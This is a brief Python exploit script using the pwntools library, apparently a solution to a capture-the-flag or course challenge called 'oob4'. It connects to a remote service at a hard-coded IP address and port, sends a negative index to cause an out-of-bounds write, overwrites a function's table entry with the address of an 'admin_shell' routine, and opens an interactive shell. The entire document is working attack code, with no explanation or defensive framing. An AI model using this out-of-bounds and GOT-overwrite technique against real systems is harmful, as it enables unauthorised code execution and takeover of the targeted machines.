from pwn import *

puts_plt = 0x601018 
admin_shell = 0x4007e6

r = remote('140.110.112.77', 3114)
#r = process('oob4')
raw_input('debug')
r.recvuntil('ID: ')
r.sendline(str(-5))
r.recvuntil('Nickname: ')
r.sendline(p64(admin_shell))
r.interactive()
